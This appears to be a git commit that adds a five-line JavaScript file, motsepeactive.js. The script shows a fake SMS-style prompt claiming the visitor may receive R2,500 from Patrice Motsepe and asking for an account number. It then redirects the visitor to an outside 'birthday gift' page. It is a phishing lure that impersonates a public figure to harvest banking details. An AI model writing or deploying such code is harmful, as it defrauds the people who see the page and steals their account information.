137bcf72b8fccdbdc6ac8126114d73e838a9b654
rmadamgspec <g5mqnsm8zn@privaterelay.appleid.com>
2026-05-25 14:21:58 +0100

    Create motsepeactive.js

---
+++ motsepeactive.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW R2,500'
+password=prompt('SMS: Congratulations, you are eligible to receive R2,500 From Patrice Motsepe, click OK to Enter Your Acc. Number','WITHDRAW R2,500');
+if (password != 'WITHDRAW R2,500') {
+location.href='https://rhud.info/Motsepe-Birthday-Gift.html';
+}
